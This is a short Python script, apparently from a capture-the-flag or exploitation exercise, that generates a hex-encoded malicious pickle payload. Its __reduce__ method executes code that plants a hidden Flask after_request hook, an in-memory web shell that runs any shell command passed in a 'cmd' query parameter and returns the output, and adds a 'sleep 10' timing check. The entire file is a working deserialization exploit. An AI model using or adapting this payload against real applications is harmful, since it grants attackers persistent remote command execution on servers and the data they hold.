import pickletools
import os
import pickle
import binascii
class student():
    def __reduce__(self):
        return (exec, ("""app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec("global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())")==None else resp);__import__('os').system('sleep 10')""",))

payload = pickle.dumps(student())
print(binascii.hexlify(payload))
# pickletools.dis(payload)